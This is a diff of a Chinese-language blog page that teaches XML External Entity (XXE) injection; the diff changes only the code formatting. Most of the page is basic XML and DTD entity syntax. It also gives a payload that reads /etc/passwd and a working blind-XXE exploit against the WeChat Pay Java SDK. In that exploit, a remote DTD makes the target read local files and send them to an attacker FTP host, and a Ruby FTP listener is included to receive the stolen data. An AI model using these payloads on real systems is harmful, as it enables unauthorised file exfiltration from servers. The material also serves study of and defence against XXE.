@@ -39,7 +39,7 @@
       
       <p>XML基础：</p>
 <p>XML文档结构：</p>
-<div class="highlight"><pre><span></span>XML声明
+<div class="highlight"><pre><span></span><code>XML声明
 <span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
 
 DTD文档类型定义
@@ -59,18 +59,18 @@ DTD文档类型定义
 <span class="nt">&lt;head&gt;</span>Reminder<span class="nt">&lt;/head&gt;</span>
 <span class="nt">&lt;body&gt;</span>You are a good man<span class="nt">&lt;/body&gt;</span>
 <span class="nt">&lt;/note&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>DTD(document type definitions)可以定义一个合法的XML文档构建模块，可以被成行声明于XML文档中，也可以作为一个外部引用。</p>
-<div class="highlight"><pre><span></span><span class="err">内部声明</span><span class="n">DTD</span><span class="err">：</span>
+<div class="highlight"><pre><span></span><code><span class="err">内部声明</span><span class="n">DTD</span><span class="err">：</span>
 
 <span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="err">跟元素</span> <span class="p">[</span><span class="err">元素声明］</span><span class="o">&gt;</span>
 
 <span class="err">引用外部</span><span class="n">DTD</span><span class="p">:</span>
 
 <span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="err">根元素</span>  <span class="k">SYSTEM</span> <span class="ss">&quot;文件名&quot;</span><span class="o">&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>DTD文档中很多关键字如下: </p>
@@ -89,55 +89,55 @@ DTD文档类型定义
 <li>参数实体 (Parameter entities）</li>
 </ul>
 <p>实体根据引用方式，可以分为内部实体和外部实体。例子：</p>
-<div class="highlight"><pre><span></span><span class="err">内部实体：</span>
-<span class="k">&lt;!ENTITY</span> <span class="ni">entity_name</span> <span class="s2">&quot;entity_value&quot;</span><span class="k">&gt;</span>
+<div class="highlight"><pre><span></span><code>内部实体：
+<span class="cp">&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</span>
 
-<span class="err">entity_name</span> <span class="err">is</span> <span class="err">the</span> <span class="err">name</span> <span class="err">of</span> <span class="err">entity</span> <span class="err">followed</span> <span class="err">by</span> <span class="err">its</span> <span class="err">value</span> <span class="err">within</span> <span class="err">the</span> <span class="err">double</span> <span class="err">quotes</span> <span class="err">or</span> <span class="err">single</span> <span class="err">quote.</span>
+entity_name is the name of entity followed by its value within the double quotes or single quote.
 
-<span class="err">entity_value</span> <span class="err">holds</span> <span class="err">the</span> <span class="err">value</span> <span class="err">for</span> <span class="err">the</span> <span class="err">entity</span> <span class="err">name</span>
+entity_value holds the value for the entity name
 
-<span class="err">外部实体：</span>
-<span class="k">&lt;!ENTITY</span> <span class="ni">name</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;URI/URL&quot;</span><span class="k">&gt;</span>
+外部实体：
+<span class="cp">&lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;</span>
 
-<span class="err">name</span> <span class="err">is</span> <span class="err">the</span> <span class="err">name</span> <span class="err">of</span> <span class="err">entity.</span>
-<span class="kc">SYSTEM</span> <span class="err">is</span> <span class="err">the</span> <span class="err">keyword.</span>
-<span class="err">URI/URL</span> <span class="err">is</span> <span class="err">the</span> <span class="err">address</span> <span class="err">of</span> <span class="err">the</span> <span class="err">external</span> <span class="err">source</span> <span class="err">enclosed</span> <span class="err">within</span> <span class="err">the</span> <span class="err">double</span> <span class="err">or</span> <span class="err">single</span> <span class="err">quotes.</span>
+name is the name of entity.
+SYSTEM is the keyword.
+URI/URL is the address of the external source enclosed within the double or single quotes.
 
-<span class="err">外部实体声明的时候可以有两种：</span><span class="kc">SYSTEM</span><span class="err">和</span><span class="kc">PUBLIC</span>
+外部实体声明的时候可以有两种：SYSTEM和PUBLIC
 
-<span class="k">&lt;!DOCTYPE</span> <span class="nt">name</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;address.dtd&quot;</span> <span class="k">[</span><span class="err">...</span><span class="k">]&gt;</span>
-<span class="k">&lt;!DOCTYPE</span> <span class="nt">name</span> <span class="kc">PUBLIC</span> <span class="s2">&quot;-//Beginning XML//DTD Address Example//EN&quot;</span><span class="k">&gt;</span>
-</pre></div>
+<span class="cp">&lt;!DOCTYPE name SYSTEM &quot;address.dtd&quot; [...]&gt;</span>
+<span class="cp">&lt;!DOCTYPE name PUBLIC &quot;-//Beginning XML//DTD Address Example//EN&quot;&gt;</span>
+</code></pre></div>
 
 
 <h3>参数实体</h3>
 <p>参数实体（Parameter entities）语法这样：</p>
-<div class="highlight"><pre><span></span><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">ename</span> <span class="s2">&quot;entity_value&quot;</span><span class="k">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">ename</span> <span class="s2">&quot;entity_value&quot;</span><span class="k">&gt;</span>
 
 <span class="err">entity_value</span> <span class="err">is</span> <span class="err">any</span> <span class="err">character</span> <span class="err">that</span> <span class="err">is</span> <span class="err">not</span> <span class="err">an</span> <span class="s1">&#39;&amp;&#39;</span><span class="o">,</span> <span class="s1">&#39;%&#39;</span> <span class="err">or</span> <span class="s1">&#39; &quot; &#39;</span><span class="err">.</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>是用%实体名称声明，引用的时候也是％实体名称，其它实体（内置实体，字符实体，通用实体）直接用实体名声声明，引用的时候用&amp;。</p>
 <p>参数实体只能在DTD中声明，DTD中引用，其它实体只能在DTD中声明，可以在xml文档中引用。</p>
 <h3>内部实体</h3>
-<div class="highlight"><pre><span></span><span class="k">&lt;!ENTITY</span> <span class="ni">实体名称</span> <span class="s2">&quot;实体的值&quot;</span><span class="k">&gt;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="k">&lt;!ENTITY</span> <span class="ni">实体名称</span> <span class="s2">&quot;实体的值&quot;</span><span class="k">&gt;</span>
+</code></pre></div>
 
 
 <h3>外部实体</h3>
-<div class="highlight"><pre><span></span><span class="k">&lt;!ENTITY</span> <span class="ni">实体名称</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;URI&quot;</span><span class="k">&gt;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="k">&lt;!ENTITY</span> <span class="ni">实体名称</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;URI&quot;</span><span class="k">&gt;</span>
+</code></pre></div>
 
 
 <h3>参数实体</h3>
-<div class="highlight"><pre><span></span><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">实体名称</span> <span class="s2">&quot;实体的值&quot;</span><span class="k">&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">实体名称</span> <span class="s2">&quot;实体的值&quot;</span><span class="k">&gt;</span>
 <span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">实体名称</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;URI&quot;</span><span class="k">&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <h3>参数实体+外部实体</h3>
-<div class="highlight"><pre><span></span><span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&quot;1.0&quot;</span> <span class="n">encoding</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="o">?&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&quot;1.0&quot;</span> <span class="n">encoding</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="o">?&gt;</span>
 <span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">a</span> <span class="p">[</span>
     <span class="o">&lt;!</span><span class="n">ENTITY</span> <span class="o">%</span> <span class="n">name</span> <span class="n">SYSTEM</span> <span class="s">&quot;file:///etc/passwd&quot;</span><span class="o">&gt;</span>
     <span class="nf">%name</span><span class="p">;</span>
@@ -157,12 +157,12 @@ DTD文档类型定义
 <span class="o">&lt;</span><span class="n">methodName</span><span class="o">&gt;&amp;</span><span class="n">zozhang</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">methodName</span><span class="o">&gt;</span>
 
 <span class="o">&lt;/</span><span class="n">methodCall</span><span class="o">&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>由于XXE漏洞主要引用了DTD的外部实体导致的漏洞，重点看下能引用哪些类型的外部实体，外部实体</p>
-<div class="highlight"><pre><span></span><span class="k">&lt;!ENTITY</span> <span class="ni">实体名称</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;URI&quot;</span><span class="k">&gt;</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="k">&lt;!ENTITY</span> <span class="ni">实体名称</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;URI&quot;</span><span class="k">&gt;</span>
+</code></pre></div>
 
 
 <p>语法引用外部实体，而非内部实体，所以URL中能写类型如下：</p>
@@ -177,21 +177,21 @@ DTD文档类型定义
 <p>2018.7.4号更新:</p>
 <p>wxpay的java SDK_v3版本出现xxe漏洞，EXP如下:</p>
 <h2>0x01 解法</h2>
-<div class="highlight"><pre><span></span><span class="err">Request的Body:</span>
+<div class="highlight"><pre><span></span><code>Request的Body:
 
-<span class="err">&lt;</span><span class="o">?</span><span class="err">xml</span> <span class="err">version=</span><span class="s2">&quot;1.0&quot;</span><span class="o">?</span><span class="k">&gt;&lt;!DOCTYPE</span> <span class="nt">root</span> <span class="k">[&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">remote</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;http://x.x.x.x:8000/data.xml&quot;</span><span class="k">&gt;</span><span class="ni">%remote;</span><span class="k">]&gt;</span><span class="err">&lt;root/</span><span class="k">&gt;</span>
+<span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://x.x.x.x:8000/data.xml&quot;&gt;</span>%remote;]&gt;<span class="nt">&lt;root/&gt;</span>
 
 
-<span class="err">data.xml:</span>
+data.xml:
 
-<span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">attack</span> <span class="kc">SYSTEM</span> <span class="s2">&quot;file:///home/&quot;</span><span class="k">&gt;</span>
-<span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">shell</span> <span class="s2">&quot;&lt;!ENTITY &amp;#37; upload SYSTEM &#39;ftp://x.x.x.x:33/%attack;</span>
-<span class="s2">&#39;&gt;&quot;</span><span class="k">&gt;</span>
-</pre></div>
+<span class="cp">&lt;!ENTITY % attack SYSTEM &quot;file:///home/&quot;&gt;</span>
+<span class="cp">&lt;!ENTITY % shell &quot;&lt;!ENTITY &amp;#37; upload SYSTEM &#39;ftp://x.x.x.x:33/%attack;</span>
+<span class="cp">&#39;&gt;</span>&quot;&gt;
+</code></pre></div>
 
 
 <p>另外需要服务器开一个ftp:</p>
-<div class="highlight"><pre><span></span><span class="n">ftp</span><span class="o">.</span><span class="n">rb</span>
+<div class="highlight"><pre><span></span><code><span class="n">ftp</span><span class="o">.</span><span class="n">rb</span>
 
 <span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
 <span class="n">server</span> <span class="o">=</span> <span class="no">TCPServer</span><span class="o">.</span><span class="n">new</span> <span class="mi">33</span> 
@@ -212,25 +212,25 @@ DTD文档类型定义
     <span class="p">}</span>
   <span class="k">end</span>
 <span class="k">end</span>
-</pre></div>
+</code></pre></div>
 
 
 <h2>0x02 解法</h2>
 <p>body:</p>
-<div class="highlight"><pre><span></span><span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&quot;1.0&quot;</span> <span class="n">encoding</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="o">?&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&quot;1.0&quot;</span> <span class="n">encoding</span><span class="o">=</span><span class="s">&quot;utf-8&quot;</span><span class="o">?&gt;</span>
 <span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">data</span> <span class="p">[</span>
 <span class="o">&lt;!</span><span class="n">ENTITY</span> <span class="o">%</span> <span class="n">file</span> <span class="n">SYSTEM</span> <span class="s">&quot;file:///home/&quot;</span><span class="o">&gt;</span>
 <span class="o">&lt;!</span><span class="n">ENTITY</span> <span class="o">%</span> <span class="n">dtd</span> <span class="n">SYSTEM</span> <span class="s">&quot;http://x.x.x.x:8000/data.xml&quot;</span><span class="o">&gt;</span>
 <span class="nf">%dtd</span><span class="p">;</span> <span class="nf">%all</span><span class="p">;</span>
 <span class="p">]</span><span class="o">&gt;</span>
 <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;&amp;</span><span class="n">send</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">value</span><span class="o">&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>服务器的xml:</p>
-<div class="highlight"><pre><span></span><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">all</span> <span class="s2">&quot;&lt;!ENTITY  send SYSTEM &#39;ftp://x.x.x.x:33/%attack;</span>
+<div class="highlight"><pre><span></span><code><span class="k">&lt;!ENTITY</span> <span class="ni">%</span> <span class="ni">all</span> <span class="s2">&quot;&lt;!ENTITY  send SYSTEM &#39;ftp://x.x.x.x:33/%attack;</span>
 <span class="s2">&#39;&gt;&quot;</span><span class="k">&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>一个是参数实体，一个是其他实体。在服务区开启<code>ruby ftp.rb</code>监听33端口，就可以等待数据过来了。因为这次的xxe属于blind xxe，在java里面只能使用ftp+file来读取文件。<a href="https://joychou.org/java/java-xxe-vulnerability.html">https://joychou.org/java/java-xxe-vulnerability.html</a> 具体情况可以看这个文章。</p>
